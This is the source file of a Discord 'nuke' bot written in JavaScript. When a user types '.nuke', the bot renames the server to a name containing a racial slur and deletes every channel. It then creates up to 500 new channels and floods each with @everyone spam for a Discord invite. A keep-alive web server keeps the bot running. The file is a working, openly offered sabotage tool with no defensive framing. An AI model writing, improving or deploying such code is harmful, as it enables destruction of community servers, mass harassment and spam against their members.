const { Client, GatewayIntentBits } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildChannels
    ]
});

const TOKEN = process.env.TOKEN;

http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '.nuke') {
        await message.delete().catch(() => {});
        const guild = message.guild;

        await guild.setName('NGA GOT NUKED BY JHUB').catch(() => {});

        for (const [, channel] of guild.channels.cache) {
            await channel.delete().catch(() => {});
            await sleep(50);
        }

        for (let i = 0; i < 500; i++) {
            const ch = await guild.channels.create({
                name: 'jhub-on-top',
                type: 0
            }).catch(() => {});

            if (ch) {
                for (let j = 0; j < 10; j++) {
                    await ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                    await sleep(200);
                }
            }
            await sleep(100);
        }
    }
});

client.login(TOKEN);
